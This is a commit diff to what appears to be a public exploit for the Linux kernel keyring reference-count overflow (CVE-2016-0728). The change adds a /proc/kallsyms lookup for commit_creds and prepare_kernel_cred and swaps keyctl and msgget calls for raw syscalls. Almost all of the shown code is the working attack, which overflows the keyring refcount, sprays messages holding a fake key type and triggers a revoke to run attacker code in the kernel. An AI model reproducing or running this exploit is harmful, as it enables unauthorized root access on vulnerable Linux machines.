2ac6aa2a00a6a0dcea8b985a4ae7ec9b935f52e5
sunnyjiang <jiangshanlin@gmail.com>
2016-01-21 17:02:23 +0800

    Update cve_2016_0728.c
    change keyctl to syscall directly

--- cve_2016_0728.c
+++ cve_2016_0728.c
@@ -11,7 +11,7 @@
 #include <unistd.h>
 
 #include <sys/ipc.h>
-#include <sys/msg.h>
+//#include <sys/msg.h>
 
 typedef int __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);
 typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);
@@ -19,10 +19,21 @@ _commit_creds commit_creds;
 _prepare_kernel_cred prepare_kernel_cred;
 
 #define STRUCT_LEN (0xb8 - 0x30)
-#define COMMIT_CREDS_ADDR (0xffffffff81094250)
-#define PREPARE_KERNEL_CREDS_ADDR (0xffffffff81094550)
 
+void *
+get_symbol(char *name)
+{
+    FILE *f = fopen("/proc/kallsyms", "r");
+    char c, sym[512];
+    void *addr;
 
+    while (fscanf(f, "%p %c %s\n", &addr, &c, sym) > 0) {
+        if (!strcmp(sym, name))
+            return addr;
+    }
+
+    return NULL;
+}
 
 struct key_type {
     char * name;
@@ -43,6 +54,7 @@ void userspace_revoke(void * key) {
 }
 
 int main(int argc, const char *argv[]) {
+
 	const char *keyring_name;
 	size_t i = 0;
     unsigned long int l = 0x100000000/2;
@@ -61,8 +73,8 @@ struct { long mtype;
 	}
 
     printf("uid=%d, euid=%d\n", getuid(), geteuid()); 
-    commit_creds = (_commit_creds) COMMIT_CREDS_ADDR;
-    prepare_kernel_cred = (_prepare_kernel_cred) PREPARE_KERNEL_CREDS_ADDR;
+    commit_creds = (_commit_creds) get_symbol("commit_creds");
+    prepare_kernel_cred = (_prepare_kernel_cred) get_symbol("prepare_kernel_cred");
     
     my_key_type = malloc(sizeof(*my_key_type));
 
@@ -77,8 +89,9 @@ struct { long mtype;
     //key->type
     *(unsigned long *)(&msg.mtext[80]) = (unsigned long)my_key_type;
 
-    if ((msqid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT)) == -1) {
-        perror("msgget");
+    //if ((msqid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT)) == -1) {
+    if ((msqid = syscall(303, IPC_PRIVATE, 0644 | IPC_CREAT)) == -1) {   
+	perror("msgget");
         exit(1);
     }
 
@@ -86,13 +99,15 @@ struct { long mtype;
 
 	/* Set the new session keyring before we start */
 
-	serial = keyctl(KEYCTL_JOIN_SESSION_KEYRING, keyring_name);
+	//serial = keyctl(KEYCTL_JOIN_SESSION_KEYRING, keyring_name);
+	serial = syscall(311, KEYCTL_JOIN_SESSION_KEYRING, keyring_name);
 	if (serial < 0) {
 		perror("keyctl");
 		return -1;
     }
 	
-	if (keyctl(KEYCTL_SETPERM, serial, KEY_POS_ALL | KEY_USR_ALL | KEY_GRP_ALL | KEY_OTH_ALL) < 0) {
+	//if (keyctl(KEYCTL_SETPERM, serial, KEY_POS_ALL | KEY_USR_ALL | KEY_GRP_ALL | KEY_OTH_ALL) < 0) {
+	if (syscall(311, KEYCTL_SETPERM, serial, KEY_POS_ALL | KEY_USR_ALL | KEY_GRP_ALL | KEY_OTH_ALL) < 0) {
 		perror("keyctl");
 		return -1;
 	}
@@ -104,7 +119,8 @@ struct { long mtype;
             l = l/2;
             sleep(5);
         }
-        if (keyctl(KEYCTL_JOIN_SESSION_KEYRING, keyring_name) < 0) {
+        //if (keyctl(KEYCTL_JOIN_SESSION_KEYRING, keyring_name) < 0) {
+	if (syscall(311, KEYCTL_JOIN_SESSION_KEYRING, keyring_name) < 0) {
             perror("keyctl");
             return -1;
         }
@@ -112,7 +128,8 @@ struct { long mtype;
     sleep(5);
     /* here we are going to leak the last references to overflow */
     for (i=0; i<5; ++i) {
-        if (keyctl(KEYCTL_JOIN_SESSION_KEYRING, keyring_name) < 0) {
+        //if (keyctl(KEYCTL_JOIN_SESSION_KEYRING, keyring_name) < 0) {
+	if (syscall(311, KEYCTL_JOIN_SESSION_KEYRING, keyring_name) < 0) {
             perror("keyctl");
             return -1;
         }
@@ -130,12 +147,14 @@ struct { long mtype;
 
         if (pid == 0) {
             sleep(2);
-            if ((msqid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT)) == -1) {
+            //if ((msqid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT)) == -1) {
+	    if ((msqid = syscall(303, IPC_PRIVATE, 0644 | IPC_CREAT)) == -1) {
                 perror("msgget");
                 exit(1);
             }
             for (i = 0; i < 64; i++) {
-                if (msgsnd(msqid, &msg, sizeof(msg.mtext), 0) == -1) {
+                //if (msgsnd(msqid, &msg, sizeof(msg.mtext), 0) == -1) {
+		if (syscall(301, msqid, &msg, sizeof(msg.mtext), 0) == -1) {
                     perror("msgsnd");
                     exit(1);
                 }
@@ -150,7 +169,8 @@ struct { long mtype;
 
     /* call userspace_revoke from kernel */
     puts("caling revoke...");
-    if (keyctl(KEYCTL_REVOKE, KEY_SPEC_SESSION_KEYRING) == -1) {
+    //if (keyctl(KEYCTL_REVOKE, KEY_SPEC_SESSION_KEYRING) == -1) {
+    if (syscall(311, KEYCTL_REVOKE, KEY_SPEC_SESSION_KEYRING) == -1) {
         perror("keyctl_revoke");
     }
 
